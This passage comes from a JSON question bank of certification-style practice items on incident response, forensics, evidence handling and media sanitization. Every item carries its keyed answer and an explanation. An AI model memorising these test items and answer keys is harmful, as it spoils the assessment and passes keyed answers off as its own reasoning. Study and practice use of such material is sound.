time.</p>","l":"c10-evidence","l2":"","k":"digital evidence location tracking"},{"id":"d3-61","set":"d3","ch":11,"d":3,"q":"Kai has completed the validation process of her media sanitization efforts and has checked a sample of the drives she had purged using a built-in cryptographic wipe utility. What is her next step?","o":["Resample to validate her testing.","Destroy the drives.","Create documentation.","She is done and can send the drives on for disposition."],"a":2,"e":"Documentation is important when tracking drives to ensure that all drives that should be sanitized are being received. Documentation can also provide evidence of proper handling for audits and internal reviews.","l":"c11-recover","l2":"","k":"media sanitization documentation"},{"id":"d3-62","set":"d3","ch":9,"d":3,"q":"In his role as a small company’s information security manager, Mike has a limited budget for hiring permanent staff. Although his team can handle simple virus infections, he does not currently have a way to handle significant information security incidents. Which of the following options should Mike investigate to ensure that his company is prepared for security incidents?","o":["Outsource to a third-party SOC.","Create an internal SOC.","Hire an internal incident response team.","Outsource to an incident response provider."],"a":3,"e":"Outsourcing to a third-party incident response provider allows Mike to bring in experts when an incident occurs while avoiding the day-to-day expense of hiring a full-time staff member. This can make a lot of financial sense if incidents occur rarely, and even large organizations bring in third-party response providers when large incidents occur. A security operations center (SOC) would be appropriate if Mike needed day-to-day security monitoring and operations, and hiring an internal team does not match Mike’s funding model limitations in this scenario.","l":"c9-foundation","l2":"","k":"CSIRT outsourcing"},{"id":"d3-63","set":"d3","ch":11,"d":3,"q":"Bohai wants to ensure that media has been properly sanitized. Which of the following options properly lists sanitization descriptions from least to most effective?","o":["Purge, clear, destroy","Eliminate, eradicate, destroy","Clear, purge, destroy","Eradicate, eliminate, destroy"],"a":2,"e":"NIST identifies three activities for media sanitization: clearing, which uses logical techniques to sanitize data in all user-addressable storage locations; purging, which applies physical or logical techniques to render data recovery infeasible using state-of-the-art laboratory techniques; and destruction, which involves physically destroying the media.","l":"c11-recover","l2":"","k":"NIST media sanitization categories"},{"id":"d3-64","set":"d3","ch":10,"d":3,"q":"An organization running a containerized application in a public cloud environment discovers that one of its Kubernetes pods was compromised and used to mine cryptocurrency. By the time the security team begins its investigation, the pod has been automatically terminated and replaced by the orchestrator’s self-healing mechanism. What is the <i>primary</i> forensic challenge in this scenario?","o":["The replacement pod contains evidence from the compromised pod.","Cloud providers do not allow forensic imaging of container infrastructure.","The ephemeral nature of the container means volatile evidence was lost when the pod was terminated.","Kubernetes clusters cannot generate logs for individual pods."],"a":2,"e":"The primary challenge is that containers are ephemeral by design. Therefore, when the compromised pod was terminated and replaced, its filesystem, running processes, network connections, and in-memory artifacts were destroyed. Unlike traditional servers, containers do not persist state after termination unless explicitly configured to do so, making volatile evidence recovery impossible after the fact. The replacement pod is a fresh instance and does not inherit any data from the compromised pod. Cloud providers do allow various forms of forensic investigation, including disk snapshots and log retrieval, though the available evidence differs from traditional environments. Kubernetes can and does generate logs for individual pods through its logging architecture, and those logs may still exist in a centralized logging system even after the pod is gone.","l":"c10-evidence","l2":"c2-infra","k":"container forensic volatility"},{"id":"d3-65","set":"d3","ch":10,"d":3,"q":"While reviewing storage usage on a Windows system, Brian checks the following volume shadow copy storage. What purpose does this storage serve, and can he safely delete it?<pre>\n<code>        C:\\WINDOWS\\system32&gt;vssadmin list Shadowstorage</code>\n<code>        vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool</code>\n<code>        (C) Copyright Microsoft Corp.</code>\n<code>        Shadow Copy Storage association</code>\n<code>           For volume: (C:)\\\\?\\Volume{c3b53dae-0e54-13e3-97ab-806e6f6e6963}\\</code>\n<code>           Shadow Copy Storage volume: (C:)\\\\?\\Volume{c3b53dae-0e54-13e3-97ab-806e6f6e6963}\\</code>\n<code>           Used Shadow Copy Storage space: 25.6 GB (2%)</code>\n<code>           Allocated Shadow Copy Storage space: 26.0 GB (2%)</code>\n<code>           Maximum Shadow Copy Storage space: 89.4 GB (10%)</code>\n</pre>","o":["It provides a hidden, block-level snapshot and can be safely deleted.","It provides secure hidden storage and can be safely deleted.","It provides secure hidden storage and cannot be safely deleted.","It provides a block-level snapshot and cannot be safely deleted."],"a":0,"e":"As long as Brian is comfortable relying on another backup mechanism, he can safely disable volume shadow copies and remove the related files. For the drive he is looking at, this will result in approximately 26 GB of storage becoming available.","l":"c10-evidence","l2":"c2-os","k":"Windows volume shadow copies"},{"id":"d3-66","set":"d3","ch":2,"d":3,"q":"Lauren recovers a number of 16 GB and 32 GB microSD cards during a forensic investigation. Without checking them manually, what filesystem type is she most likely to find them formatted in as if they were used with a digital camera?","o":["RAW","FAT16","FAT32","APFS"],"a":2,"e":"Most portable consumer devices, especially those that generate large files, format their storage as FAT32. FAT16 is limited to 2 GB partitions, RAW is a photo file format, and APFS is the native macOS filesystem format. Lauren can expect most devices to format media as FAT32 by default because of its broad compatibility across devices and operating systems.","l":"c2-os","l2":"c10-evidence","k":"removable media FAT32 filesystem"},{"id":"d3-67","set":"d3","ch":10,"d":3,"q":"After arriving at an investigation site, Brian determines that three powered-on computers need to be taken for forensic examination. What steps should he take before removing the PCs?","o":["Power them down, take pictures of how each is connected, and log each system in as evidence.","Take photos of each system, power them down, and attach a tamper-evident seal to each PC.","Collect live forensic information, take photos of each system, and power them down.","Collect a static drive image, validate the hash of the image, and securely transport each system."],"a":2,"e":"Brian should determine whether he needs live forensic information, but if he is not certain, the safest path for him is to collect live forensic information, take photos so that he knows how each system was set up and configured, and then power them down. He would then log each system as evidence and will likely create forensic copies of the drives once he reaches his forensic work area or may use a portable forensic system to make drive images onsite. Powering a running system down can result in the loss of significant forensic information, meaning that powering a system down before collecting some information is typically not recommended. Collecting a static image of a drive requires powering the system down first.","l":"c10-evidence","l2":"","k":"live system evidence collection"},{"id":"d3-68","set":"d3","ch":10,"d":3,"q":"In his role as a forensic examiner, Lukas has been asked to produce forensic evidence related to a civil case. What is this process called?","o":["Criminal forensics","E-discovery","Cyber production","Civil tort"],"a":1,"e":"When forensic evidence or information is produced for a civil case (or other legal matter), it is called e-discovery. This type of discovery often involves massive amounts of data, including email, files, text messages, and any other electronic evidence that is relevant to the case.","l":"c10-analysis","l2":"","k":"electronic discovery e discovery"},{"id":"d3-69","set":"d3","ch":10,"d":3,"q":"As Mika studies her company’s computer forensics playbook, she notices that forensic investigators are required to use a chain of custody form. Which of the following best describes the information that she should record on that form if she was conducting a forensic investigation?","o":["The list of individuals who made contact with files leading to the investigation","The list of former owners or operators of the PC involved in the investigation","All individuals who work with evidence in the investigation","The police officers who take possession of the evidence"],"a":2,"e":"A chain of custody form is used to record each person who works with or is in contact with evidence in an investigation. Typically, investigative work is also done in a way that fully records all actions taken and sometimes requires two people present to verify actions taken.","l":"c10-analysis","l2":"","k":"chain of custody records"},{"id":"d3-70","set":"d3","ch":6,"d":3,"q":"Scott needs to ensure that the system he just rebuilt after an incident is secure. Which type of scan will provide him with the most useful information to meet his goal?","o":["An authenticated vulnerability scan from a trusted internal network","An unauthenticated vulnerability scan from a trusted internal network","An authenticated scan from an untrusted external network","An unauthenticated scan from an untrusted external network"],"a":0,"e":"Since Scott needs to know more about potential vulnerabilities, an authenticated scan from a trusted internal network will provide him with the most information. He will not gain a real attacker’s view, but in this case, having more detail is important.","l":"c6-config","l2":"c11-recover","k":"authenticated vulnerability scanning"},{"id":"d3-71","set":"d3","ch":9,"d":3,"q":"What is the primary role of management in the incident response process?","o":["Leading the CSIRT","Acting as the primary interface with law enforcement","Providing authority and resources","Assessing impact on stakeholders"],"a":2,"e":"The primary role of management in an incident response effort is to provide the authority and resources required to respond appropriately to the incident. They may also be asked to make business decisions, communicate with external groups, or assess the impact on key stakeholders.","l":"c9-foundation","l2":"","k":"incident response management role"},{"id":"d3-72","set":"d3","ch":9,"d":3,"q":"Max wants to improve the effectiveness of the incident analysis process he is responsible for as the leader of his organization’s CSIRT. Which of the following is not a commonly recommended best practice based on NIST’s guidelines?","o":["Profile networks and systems to measure the characteristics of expected activity.","Perform event correlation to combine information from multiple sources.","Maintain backups of every system and device.","Capture network traffic as soon as an incident is suspected."],"a":2,"e":"NIST does not include making backups of every system and device in its documentation. Instead, NIST suggests maintaining an organization-wide knowledge base with critical information about systems and applications. Backing up every device and system can be prohibitively expensive. Backups are typically done only for specific systems and devices, with configuration and restoration data stored for the rest.","l":"c9-process","l2":"","k":"incident analysis effectiveness"},{"id":"d3-73","set":"d3","ch":9,"d":3,"q":"NIST describes four major phases in the incident response cycle. Which of the following is <i>not</i> one of the four?","o":["Containment, eradication, and recovery","Notification and communication","Detection and analysis","Preparation"],"a":1,"e":"NIST identifies four major phases in the IR life cycle: preparation; detection and analysis; containment, eradication, and recovery; and post-incident activity. Notification and communication may occur in multiple phases.","l":"c9-process","l2":"","k":"NIST incident response phases"},{"id":"d3-74","set":"d3","ch":10,"d":3,"q":"Charles wants to perform memory forensics on a Windows system and wants to access <code>pagefile.sys</code>. When he attempts to copy it, he receives the following error. What access method is required to access the page file?\n<figure><img alt=\"Screenshot depicts the File In Use dialog box stating action not completed because the file is open in another program, with two buttons.\" loading=\"lazy\" src=\"img/pt/c03fun007.png\"/></figure>","o":["Run Windows File Explorer as an administrator and repeat the copy.","Open the file using <code>fmem</code>.","Run <code>cmd.exe</code> as an administrator and repeat the copy.","Shut the system down, remove the drive, and copy it from another system."],"a":3,"e":"The page file, like many system files, is locked while Windows is running. Charles simply needs to shut down the system and copy the page file. Some Windows systems may be set to purge the page file when the system is shut down, so he may need to pull the plug to get an intact page file.","l":"c10-evidence","l2":"","k":"pagefile evidence acquisition"},{"id":"d3-75","set":"d3","ch":10,"d":3,"q":"Where is slack space found in the following Windows partition map?\n<figure><img alt=\"Screenshot shows a Windows partition map for Disk 0 with System Reserved 100 M B, C drive 893.71 G B N T F S, and 449 M B unallocated space.\" loading=\"lazy\" src=\"img/pt/c03fun008.png\"/></figure>","o":["The System Reserved partition","The System Reserved and Unallocated partitions","The System Reserved and <code>C:</code> partitions","The <code>C:</code> and unallocated partitions"],"a":2,"e":"Slack space is leftover storage that exists because files do not take up the entire space allocated for them. Since the Unallocated partition does not have a filesystem on it, space there should not be considered slack space. Both System Reserved and C: are formatted with NTFS and will have slack space between files.","l":"c10-evidence","l2":"c2-os","k":"filesystem slack space"},{"id":"d3-76","set":"d3","ch":9,"d":3,"q":"Ty needs to determine the proper retention policy for his organization’s incident data. If he wants to follow common industry practices and does not have specific legal or contractual obligations that he needs to meet, what timeframe should he select?","o":["30 days","90 days","1 to 2 years","7 years"],"a":2,"e":"Without other requirements in place, many organizations select a one- to two-year retention period. This allows enough time to use existing information for investigations but does not retain so much data that it cannot be managed. Regardless of the time period selected, organizations should set and consistently follow a retention policy. The requirement for a 7-year retention period typically relates to financial records retention mandated by the government. Organizations would not typically retain incident investigation materials for that long without an outside requirement to do so.","l":"c9-process","l2":"c11-recover","k":"incident evidence retention policy"},{"id":"d3-77","set":"d3","ch":11,"d":3,"q":"The system that Alice has identified as the source of beaconing traffic is one of her organization’s critical e-commerce servers. To maintain her organization’s operations, she needs to quickly restore the server to its original, uncompromised state. What criterion is likely to be impacted the most by this action?","o":["Damage to the system or service","Service availability","Ability to preserve evidence","Time and resources needed to implement the strategy"],"a":2,"e":"If Alice focuses on a quick restoration, she is unlikely to preserve all of the evidence she would be able to during a longer incident response process. Since she is focusing on quick restoration, the service should be available more quickly, and the service and system should not be damaged in any significant way by the restoration process. The time required to implement the strategy will typically be less if she does not conduct a full forensic investigation and instead focuses on service restoration.","l":"c11-contain","l2":"c10-evidence","k":"containment strategy trade offs"},{"id":"d3-78","set":"d3","ch":10,"d":3,"q":"Piper wants to create a forensic image that third-party investigators can use but does not know what tool the third-party investigation team that her company intends to engage will use. Which of the following forensic formats should she choose if she wants almost any forensic tool to be able to access the image?","o":["E01","AFF","RAW","AD1"],"a":2,"e":"A RAW image, like those created by <code>dd</code>, is Piper’s best option for broad compatibility. Many forensic tools support multiple image formats, but RAW files are supported almost universally by forensic tools.","l":"c10-evidence","l2":"","k":"raw forensic image format"},{"id":"d3-79","set":"d3","ch":10,"d":3,"q":"As part of his forensic investigation, Scott intends to make a forensic image of a network share that is mounted by the PC that is the focus of his investigation. What information will he be unable to capture?","o":["File creation dates","Deleted files","File permission data","File metadata"],"a":1,"e":"When a network share or mounted drive is captured from the system that mounts it, data such as deleted files, unallocated space, and other information that requires direct drive access will not be captured. If Scott needs that information, he will need to create a forensic image of the drive from the host server.","l":"c10-evidence","l2":"","k":"network share forensic acquisition"},{"id":"d3-80","set":"d3","ch":9,"d":3,"q":"What common incident response follow-up activity includes asking questions like “What additional tools or resources are needed to detect or analyze future events?”","o":["Preparation","Lessons learned review","Evidence gathering","Procedural analysis"],"a":1,"e":"Questions including what tools and resources are needed to detect, analyze, or mitigate future incidents, as well as topics such as how information sharing could be improved, what could be done better or differently, and how effective existing processes and policies are, can all be part of the lessons learned review.","l":"c9-process","l2":"c11-recover","k":"lessons learned review questions"},{"id":"d3-81","set":"d3","ch":10,"d":3,"q":"Suki has been asked to capture forensic data from a Windows PC and needs to ensure that she captures the data in their order of volatility. Which order is correct from most to least volatile?","o":["Network traffic, CPU cache, disk drives, optical media","CPU cache, network traffic, disk drives, optical media","Optical media, disk drives, network traffic, CPU cache","Network traffic, CPU cache, optical media, disk drives"],"a":1,"e":"The order of volatility for common storage locations is as follows:\n<ol class=\"decimal\">\n<li>CPU cache, registers, running processes, RAM</li>\n<li>Network traffic</li>\n<li>Disk drives</li>\n<li>Backups, printouts, optical media</li></ol>","l":"c10-evidence","l2":"","k":"order of volatility"},{"id":"d3-82","set":"d3","ch":11,"d":3,"q":"During an incident response process, Suki heads to a compromised system and disconnects its network cable. What phase of the incident response process is Suki performing?","o":["Recovery","Detection and analysis","Containment","Eradication"],"a":2,"e":"Removing a system from the network typically occurs as part of the containment phase of an incident response process. Systems are typically not returned to the network until the end of the recovery phase.","l":"c11-contain","l2":"","k":"network disconnection containment"},{"id":"d3-83","set":"d3","ch":10,"d":3,"q":"Scott needs to verify that the forensic image he has created is an exact duplicate of the original drive. Which of the following methods is considered the current forensic standard?","o":["Create a MD5 hash.","Create a SHA-1 hash.","Create a SHA-256 hash.","All of the above."],"a":2,"e":"Using a SHA-256 hash is considered the current forensic standard because it provides a much stronger, collision-resistant hashing method than older algorithms and is widely recommended in modern forensic practice for demonstrating image integrity. MD5 was historically popular, but known collision vulnerabilities reduce confidence in its use as a primary integrity check in contemporary cases, particularly where evidence may be legally challenged. SHA-1 is stronger than MD5 but has also been shown to be vulnerable to practical collision attacks, so it is similarly discouraged as a sole verification mechanism. Grouping all three together suggests they are equally acceptable as current standards, but present best practice emphasizes stronger algorithms such as SHA-256 for evidentiary reliability.","l":"c10-analysis","l2":"","k":"SHA 256 forensic hash verification"},{"id":"d3-84","set":"d3","ch":11,"d":3,"q":"What strategy is the best practice for identifying attackers during an incident response process?","o":["Use geographic IP tracking to identify the attacker’s location.","Contact upstream ISPs for assistance in tracking down the attacker.","Contact local law enforcement so that they can use law enforcement–specific tools.","Identifying attackers is not an important part of the incident response process."],"a":3,"e":"Treating attacker identification as a low priority during incident response is the best practice, because the primary goals in an active incident are containment, eradication, recovery, and preservation of evidence, not attribution, which is complex, often unreliable, and typically handled later by specialized teams or law enforcement. Relying on geographic IP tracking to identify who is behind an attack is highly misleading, since attackers routinely use proxies, VPNs, and compromised hosts that obscure their true location. Contacting upstream ISPs directly to track down an attacker is rarely effective for real-time operations and usually must be coordinated through formal legal or law enforcement channels, not as an ad hoc response step. Involving local law enforcement so they can use specialized tools may be appropriate for serious incidents, but that supports potential criminal investigation rather than serving as a standard incident response tactic for “identifying the attacker” during technical response.","l":"c11-contain","l2":"","k":"attacker identification priority"},{"id":"d3-85","set":"d3","ch":10,"d":3,"q":"While performing forensic analysis of a mobile device backup file, Cynthia discovers that she has only some of the information that she expects the phone to contain. What is the most likely scenario that would result in the backup she is using having partial information?","o":["The backup was interrupted.","The backup is encrypted.","The backup is a differential backup.","The backup is stored in the cloud."],"a":2,"e":"Mobile device backups to local systems can be full or differential, and in this scenario the most likely issue is that Cynthia has recovered a differential backup. She should look for additional backup files if she does not have access to the original phone. If the backup was encrypted, she would not be able to access it without a cracking tool, and if it was interrupted, she would be unlikely to have the backup file or have it be in usable condition. Cloud backups require access to the user’s computer or account and are less likely to be part of a forensic investigation.","l":"c10-evidence","l2":"","k":"mobile device backup forensics"},{"id":"d3-86","set":"d3","ch":10,"d":3,"q":"Cullen wants to ensure that his chain of custody documentation will stand up to examination in court. Which of the following options will provide him with the best documentary proof of his actions?","o":["A second examiner acting as a witness and countersigning all actions","A complete forensic logbook signed and sealed by a notary public","A documented forensic process with required sign-off","Taking pictures of all independent forensic actions"],"a":0,"e":"A second forensic examiner who acts as a witness, countersigning all documentation and helping document all actions, provides both strong documentation and another potential witness in court. Independent forensic action, no matter how well documented, will not be as reliable as having a witness.","l":"c10-analysis","l2":"","k":"chain of custody witness verification"},{"id":"d3-87","set":"d3","ch":11,"d":3,"q":"Cynthia is reviewing her organization’s incident response recovery process, which is outlined here. Which of the following recommendations should she make to ensure that further issues do not occur during the restoration process?\n<figure><img alt=\"Flowchart depicts incident response recovery steps to restore from clean backups, install patches, change passwords, and assess security.\" loading=\"lazy\" src=\"img/pt/c03fun009.png\"/></figure>","o":["Change passwords before restoring from backups.","Isolate the system before restoring from backups.","Securely wipe the drive before restoration.","Vulnerability scan before patching."],"a":1,"e":"Although it may seem obvious that the system should be isolated from the network when it is rebuilt, we have seen this exact scenario play out before. In one instance, the system was compromised twice before the system administrator learned their lesson!","l":"c11-recover","l2":"c11-contain","k":"system restoration isolation"},{"id":"d3-88","set":"d3","ch":10,"d":3,"q":"Saria is reviewing the contents of a drive as part of a forensic effort and notes that the file she is reviewing takes up more space on the disk than its actual size, as shown here. What has she discovered?\n<figure><img alt=\"Screenshot depicts example 2 text Properties dialog box with file type, location, size, dates, and attribute checkboxes.\" loading=\"lazy\" src=\"img/pt/c03fun010.png\"/></figure>","o":["Slack space","Hidden content","Sparse files","Encryption overhead"],"a":0,"e":"The space that Saria sees is the space between the end of the file and the space allocated per cluster or block. This space may contain remnants of previous files written to the cluster or block or may simply contain random data from when the disk was formatted or initialized.","l":"c10-evidence","l2":"c10-analysis","k":"filesystem slack space"},{"id":"d3-89","set":"d3","ch":11,"d":3,"q":"Kathleen is restoring a critical business system to operation after a major compromise and needs to validate that the operating system and application files are legitimate and do not have any malicious code included in them. What type of tool should she use to validate this?","o":["A reference hash database","Dynamic code analysis","Static code analysis","File rainbow tables"],"a":0,"e":"A reference hash database like the one provided by the National Software Reference Library includes known good hashes of many operating systems and applications. Kathleen can validate the files on her system using references like the NSRL (<code><a href=\"http://www.nsrl.nist.gov/new.html\">www.nsrl.nist.gov/new.html</a></code>).","l":"c11-recover","l2":"c10-analysis","k":"reference hash database NSRL"},{"id":"d3-90","set":"d3","ch":11,"d":3,"q":"Mel is creating the evidence log for a computer that was part of an attack on an external third-party system. What network-related information is most important to include in that log?","o":["Subnet mask, DHCP server, hostname, MAC address","IP addresses, MAC addresses, hostname","Domain, hostname, MAC addresses, IP addresses","NIC manufacturer, MAC addresses, IP addresses, DHCP configuration"],"a":2,"e":"Including the domain, hostname, MAC addresses, and IP addresses provides the most useful set of identifiers to tie the specific system to observed malicious traffic and to the organization’s environment, since IP and MAC information link the device to network activity while the hostname and domain membership connect it to a particular asset and account context. A list that omits IP addresses in favor of subnet mask and DHCP server details does not give the direct identifiers needed to correlate with logs from the external third party. A combination of IP addresses, MAC addresses, and hostnames is very helpful, but the lack of domain information makes it harder to associate systems with specific users or organizational units in a larger directory environment. Adding NIC manufacturer and DHCP configuration offers little value for attribution or correlation compared to having the domain, which is a key identity element in many enterprise networks.","l":"c11-contain","l2":"c10-analysis","k":"evidence log system identifiers"},{"id":"d3-91","set":"d3","ch":10,"d":3,"q":"Ryan believes that systems on his network have been compromised by an advanced persistent threat actor. He has observed a number of large file transfers outbound to remote sites via TLS-protected HTTP sessions from systems that do not typically send data to those locations. Which of the following techniques is most likely to detect the APT infections?","o":["Network traffic analysis","Network forensics","Endpoint behavior analysis","Endpoint forensics"],"a":3,"e":"Since most APTs (including this one, as specified in the question) send traffic in an encrypted form, performing network forensics or traffic analysis will only provide information about potentially infected hosts. If Ryan wants to find the actual tools that may exist on endpoint systems, he should conduct endpoint forensics. Along the way, he may use endpoint behavior analysis, network forensics, and network traffic analysis to help identify target systems.","l":"c10-evidence","l2":"c3-host","k":"endpoint forensic analysis"},{"id":"d3-92","set":"d3","ch":11,"d":3,"q":"Ben is investigating a potential malware infection of a laptop belonging to a senior manager in the company he works for. When the manager opens a document, website, or other application that takes user input, words start to appear as though they are being typed. What is the first step that Ben should take in his investigation?","o":["Run an antivirus scan.","Disconnect the system from the network.","Wipe the system and reinstall.","Observe and record what is being typed."],"a":1,"e":"When a system is not a critical business asset that must remain online, the best response is typically to isolate it from other systems and networks that it could negatively impact. By disconnecting it from all networks, Ben can safely investigate the issue without causing undue risk.\n<p>We have actually encountered this situation. After investigating, we found that the user’s text-to-speech application was enabled, and the microphone had the gain turned all the way up. The system was automatically typing words based on how it interpreted background noise, resulting in strange text that terrified the unsuspecting user.</p>","l":"c11-contain","l2":"","k":"endpoint network isolation"},{"id":"d3-93","set":"d3","ch":10,"d":3,"q":"Kathleen’s forensic analysis of a laptop that is believed to have been used to access sensitive corporate data shows that the suspect tried to overwrite the data they downloaded as part of antiforensic activities by deleting the original files and then copying other files to the drive. Where is Kathleen most likely to find evidence of the original files?","o":["The MBR","Unallocated space","Slack space","The FAT"],"a":2,"e":"When clusters are overwritten, original data is left in the unused space between the end of the new file and the end of the cluster. This means that copying new files over old files can leave remnant data that may help Kathleen prove that the files were on the system by examining slack space.","l":"c10-evidence","l2":"c10-analysis","k":"cluster slack space data remnants"},{"id":"d3-94","set":"d3","ch":10,"d":3,"q":"Angela wants to access the decryption key for a BitLocker-encrypted system, but the system is currently powered off due to hibernation. Which of the following methods is a viable method to allow recovery of the BitLocker decryption key?","o":["Hibernation file analysis","Memory analysis","Boot-sector analysis","Brute-force cracking"],"a":0,"e":"If the system that Angela is attempting to access had mounted the encrypted volume before going to sleep and there is a hibernation file, Angela can use hibernation file analysis tools to retrieve the BitLocker key. If the system did not hibernate or the volume was not mounted when the system went to sleep, she will not be able to retrieve the keys. Memory analysis won’t work with a system that is off, the boot sector does not contain keys, and brute-force cracking is not a viable method of cracking BitLocker keys because of the time involved.","l":"c10-evidence","l2":"c10-analysis","k":"hibernation file memory analysis"},{"id":"d3-95","set":"d3","ch":3,"d":3,"q":"Adam believes that a system on his network is infected but does not know which system. To detect it, he creates a query for his network monitoring software based on the following pseudocode. What type of traffic is he most likely trying to detect?<pre>\n<code>        destip: [*] and duration &lt; 10 packets and destbytes &lt; 3000 and flowcompleted = true</code>\n<code>        and application = http or https or tcp or unknown and content != uripath:* and content</code>\n<code>        != contentencoding:*</code>\n</pre>","o":["Users browsing malicious sites","Adware","Beaconing","Outbound port scanning"],"a":2,"e":"The pseudocode tells you that Adam is trying to detect outbound packets that are part of short communications (fewer than 10 packets and fewer than 3,000 bytes) and that he believes the traffic may appear to be web traffic, be general TCP traffic, or not match known traffic types. This is consistent with the attributes of beaconing traffic. Adam also is making sure that general web traffic won’t be captured by not matching on <code>uripath</code> and <code>contentencoding</code>.","l":"c3-network","l2":"","k":"malware beaconing detection"},{"id":"d3-96","set":"d3","ch":10,"d":3,"q":"As an employee of the U.S. government, Megan is required to use NIST’s information impact categories to classify security incidents. During a recent incident, proprietary information was changed. How should she classify this incident?","o":["As a privacy breach","As an integrity loss","As a proprietary breach","As an availability breach"],"a":1,"e":"NIST classifies changes or deletion of sensitive or proprietary information as an integrity loss. Proprietary breaches occur when unclassified proprietary information is accessed or exfiltrated, and privacy breaches involve personally identifiable information (PII) that is accessed or exfiltrated.","l":"c10-evidence","l2":"","k":"NIST information impact categories"},{"id":"d3-97","set":"d3","ch":10,"d":3,"q":"During an investigation, the incident handler is trying to build a timeline across firewall logs, EDR alerts, and cloud sign-in logs. The team notices the timestamps are inconsistent by several minutes between systems, making event sequencing unreliable.\n<p>What is the <i>best</i> next step to improve the accuracy of the incident timeline?</p>","o":["Disable all time synchronization so that each device uses its local clock consistently.","Convert all logs to UTC and validate NTP configuration.","Use only the EDR console timestamps.","Focus on containment first and skip timeline creation until the post-incident phase."],"a":1,"e":"Converting all logs to coordinated universal time (UTC) and validating Network Time Protocol (NTP) configuration is the best next step because using a common time standard combined with properly synchronized clocks across systems allows accurate correlation and sequencing of events from disparate sources, which is critical to reconstructing the attack timeline. Disabling time synchronization so each device uses its local clock consistently leaves you with drifting, inconsistent times that become even less reliable over longer periods. Relying only on EDR console timestamps ignores valuable evidence from other sources such as firewalls and cloud logs and risks missing or misattributing key actions that do not surface in the EDR tool. Skipping timeline creation until the post-incident phase sacrifices situational awareness during the active response and makes it harder to understand attacker progression, which can delay or weaken containment and eradication decisions.","l":"c10-analysis","l2":"c2-logging","k":"log timestamp normalization UTC"},{"id":"d3-98","set":"d3","ch":11,"d":3,"q":"A healthcare organization detects abnormal database queries from an application server. The queries match patterns associated with bulk extraction of patient records. Network monitoring shows the server is also communicating with a new external IP on a non-standard port. The on-call analyst can immediately isolate the server, but doing so will interrupt patient registration and medication ordering.\n<p>What is the <i>best</i> action to take next?</p>","o":["Immediately isolate the server.","Determine scope and potential impact and escalate to incident leadership.","Leave the server online to avoid operational impact and enable additional logging for continuous monitoring.","Begin eradication by uninstalling suspected software and rebooting the server to stop the activity."],"a":1,"e":"Determining the scope and potential impact and escalating to incident leadership is the best next action because the situation involves a direct trade-off between protecting highly sensitive patient data and maintaining mission-critical clinical services such as registration and medication ordering, and that business risk decision belongs with incident leadership and clinical stakeholders after they are briefed with concrete technical facts. Immediately isolating the server might be appropriate in some incidents, but here it could disrupt patient care without first confirming severity, alternatives, or compensating controls. Leaving the server online solely to avoid operational impact, even with extra logging, tolerates likely ongoing data theft of protected health information and fails to meet the organization’s duty to actively respond to a probable breach. Jumping straight to eradication activities such as uninstalling suspected software and rebooting the server risks altering or destroying forensic evidence, and it still does not address the required leadership decision about acceptable impact to clinical operations during the response.","l":"c11-contain","l2":"","k":"containment escalation decision"},{"id":"d3-99","set":"d3","ch":10,"d":3,"q":"Which of the following is not a valid use case for live forensic imaging?","o":["Malware analysis","Encrypted drives","Postmortem forensics","Nonsupported filesystems"],"a":2,"e":"Postmortem forensics can typically be done after shutting down systems to ensure that a complete forensic copy is made. Live forensics imaging can help to capture memory-resident malware. It can also aid in the capture of encrypted drives and filesystems when they are decrypted for live usage. Finally, unsupported filesystems can sometimes be imaged while the system is booted by copying data off the system to a supported filesystem type. This won’t retain some filesystem-specific data but can allow key forensic activities to take place.","l":"c10-evidence","l2":"","k":"live vs postmortem forensics"},{"id":"d3-100","set":"d3","ch":11,"d":3,"q":"While reviewing the actions taken during an incident response process, Mei is informed by the local desktop support staff member that the infected machine was returned to service by using a Windows System Restore point. Which of the following items will a Windows System Restore return to a previous state?","o":["Personal files","Malware","Windows system files","All installed apps"],"a":2,"e":"A Windows System Restore should not be used to rebuild a system after an infection or compromise since it restores only Windows system files, some program files, Registry settings, and hardware drivers. This means that personal files and most malware, as well as programs installed or modifications to programs after the restore point is created, will not be restored.","l":"c11-recover","l2":"c2-os","k":"system rebuild vs system restore"},{"id":"d3-101","set":"d3","ch":10,"d":3,"q":"During a major incident response effort, Kobe discovers evidence that a critical application server may have been the data repository and egress point in the compromise he is investigating. If he is unable to take the system offline, which of the following options will provide him with the best forensic data?","o":["Reboot the server and mount the system drive using a USB-bootable forensic suite.","Create an image using a tool like FTK Imager Lite.","Capture the system memory using a tool like Volatility.","Install and run an imaging tool on the live server."],"a":1,"e":"Portable imaging tools like FTK Imager Lite can be run from removable media, allowing a live image to be captured. Kobe may still want to capture the system memory as well, but when systems are used for data gathering and egress, the contents of the disk will be important. Installing a tool or taking the system offline and mounting the drive are both undesirable in this type of scenario when the system must stay online and should not be modified.","l":"c10-evidence","l2":"","k":"live forensic disk imaging"},{"id":"d3-102","set":"d3","ch":3,"d":3,"q":"Manish finds the following entries on a Linux system in <code>/var/log/auth.log</code>. If he is the only user with root privileges, requires two-factor authentication to log in as root, and did not take the actions shown, what should he check for?\n<figure><img alt=\"Screenshot of a Kali Linux authentication log listing entries for user creation, sudo commands, and password changes for demo and Apache 2.\" loading=\"lazy\" src=\"img/pt/c03fun011.png\"/></figure>","o":["A hacked root account","A privilege escalation attack from a lower privileged account or service","A malware infection","A RAT"],"a":1,"e":"If Manish has good reason to believe he is the only person with root access to the system, he should look for a privilege escalation attack. A remote access trojan would not directly provide root access, and a hacked root account is less likely than a privilege escalation attack. A malware infection is possible, and privilege escalation would be required to take the actions shown.","l":"c3-host","l2":"c7-server-network","k":"privilege escalation log analysis"},{"id":"d3-103","set":"d3","ch":10,"d":3,"q":"As part of his forensic analysis of a series of photos, John runs <code>exiftool</code> for each photo. He receives the following listing from one photo. What useful forensic information can he gather from this photo?\n<figure><img alt=\"Screenshot lists exiftool output depicts iPhone X metadata with G P S coordinates, timestamps, and image details for forensic analysis.\" loading=\"lazy\" src=\"img/pt/c03fun012.png\"/></figure>","o":["The original creation date, the device type, the GPS location, and the creator’s name","The endian order of the file, the file type, the GPS location, and the scene type","The original creation date, the device type, the GPS location, and manufacturer of the device","The MIME type, the GPS time, the GPS location, and the creator’s name"],"a":2,"e":"The original creation date (as shown by the GPS date), the device type (an iPhone X), the GPS location, and the manufacturer of the device (Apple) can all provide useful forensic information. Here, you know when the photo was taken, where it was taken, and what type of device it was taken on. This can help narrow down who took the photo or may provide other useful clues when combined with other forensic information or theories.","l":"c10-analysis","l2":"c10-evidence","k":"exiftool metadata analysis"},{"id":"d3-104","set":"d3","ch":9,"d":3,"q":"During the preparation phase of his organization’s incident response process, Oscar gathers a laptop with useful software including a sniffer and forensics tools, 